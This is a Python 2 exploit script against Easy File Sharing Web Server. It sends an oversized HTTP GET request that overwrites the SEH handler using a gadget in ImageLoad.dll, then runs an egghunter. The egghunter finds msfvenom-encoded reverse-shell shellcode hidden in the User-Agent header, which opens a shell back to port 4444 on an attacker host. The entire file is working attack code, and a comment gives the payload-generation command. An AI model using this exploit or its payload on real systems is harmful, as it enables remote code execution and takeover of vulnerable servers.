import socket
from struct import pack
def p32(x):
	return pack("<L",x)
host = "192.168.99.4"
port = 80
buz=5000
#  msfvenom -a x86 -p windows/shell/reverse_tcp LHOST=192.168.99.5 LPORT=4444   -e x86/shikata_ga_nai  -b '\x00\x0a\x0d\x0d' -i 3 -f python
# 0x100226a3 : pop esi # pop ebx # ret 0x10 |  {PAGE_EXECUTE_READ} [ImageLoad.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\EFS Software\Easy File Sharing Web Server\ImageLoad.dll)
shellcode=("\xba\xb3\xb3\x14\xcd\xd9\xc0\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x53\x83\xc0\x04\x31\x50\x0e\x03\xe3\xbd\xf6\x38\xff\x2a\x74"
"\xc2\xff\xaa\x19\x4a\x1a\x9b\x19\x28\x6f\x8c\xa9\x3a\x3d\x21"
"\x41\x6e\xd5\xb2\x27\xa7\xda\x73\x8d\x91\xd5\x84\xbe\xe2\x74"
"\x07\xbd\x36\x56\x36\x0e\x4b\x97\x7f\x73\xa6\xc5\x28\xff\x15"
"\xf9\x5d\xb5\xa5\x72\x2d\x5b\xae\x67\xe6\x5a\x9f\x36\x7c\x05"
"\x3f\xb9\x51\x3d\x76\xa1\xb6\x78\xc0\x5a\x0c\xf6\xd3\x8a\x5c"
"\xf7\x78\xf3\x50\x0a\x80\x34\x56\xf5\xf7\x4c\xa4\x88\x0f\x8b"
"\xd6\x56\x85\x0f\x70\x1c\x3d\xeb\x80\xf1\xd8\x78\x8e\xbe\xaf"
"\x26\x93\x41\x63\x5d\xaf\xca\x82\xb1\x39\x88\xa0\x15\x61\x4a"
"\xc8\x0c\xcf\x3d\xf5\x4e\xb0\xe2\x53\x05\x5d\xf6\xe9\x44\x0a"
"\x3b\xc0\x76\xca\x53\x53\x05\xf8\xfc\xcf\x81\xb0\x75\xd6\x56"
"\xb6\xaf\xae\xc8\x49\x50\xcf\xc1\x8d\x04\x9f\x79\x27\x25\x74"
"\x79\xc8\xf0\xe1\x71\x6f\xab\x17\x7c\xcf\x1b\x98\x2e\xb8\x71"
"\x17\x11\xd8\x79\xfd\x3a\x71\x84\xfe\x55\xde\x01\x18\x3f\xce"
"\x47\xb2\xd7\x2c\xbc\x0b\x40\x4e\x96\x23\xe6\x07\xf0\xf4\x09"
"\x98\xd6\x52\x9d\x13\x35\x67\xbc\x23\x10\xcf\xa9\xb4\xee\x9e"
"\x98\x25\xee\x8a\x4a\xc5\x7d\x51\x8a\x80\x9d\xce\xdd\xc5\x50"
"\x07\x8b\xfb\xcb\xb1\xa9\x01\x8d\xfa\x69\xde\x6e\x04\x70\x93"
"\xcb\x22\x62\x6d\xd3\x6e\xd6\x21\x82\x38\x80\x87\x7c\x8b\x7a"
"\x5e\xd2\x45\xea\x27\x18\x56\x6c\x28\x75\x20\x90\x99\x20\x75"
"\xaf\x16\xa5\x71\xc8\x4a\x55\x7d\x03\xcf\x65\x34\x09\x66\xee"
"\x91\xd8\x3a\x73\x22\x37\x78\x8a\xa1\xbd\x01\x69\xb9\xb4\x04"
"\x35\x7d\x25\x75\x26\xe8\x49\x2a\x47\x39")
spo="A"*4061
Nseh="\x90\x90\xeb\x06" #Nseh
SEH=p32(0x100226a3) #SEH
egg="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egg+="\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
exp=spo+Nseh+SEH+"\x90"*5+egg+"\x90"*(buz-len(Nseh)-len(SEH))
request = "GET "+exp+" HTTP/1.1 \r\n"
request+="Host:"+host+" \r\n"
request+="User-Agent : w00tw00t"+shellcode+"\r\n"
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((host, port))
print "[*] Successfully connected to " + host + "!!!"
s.send(request)
print "[!] Request has been sent!\n"
s.close()
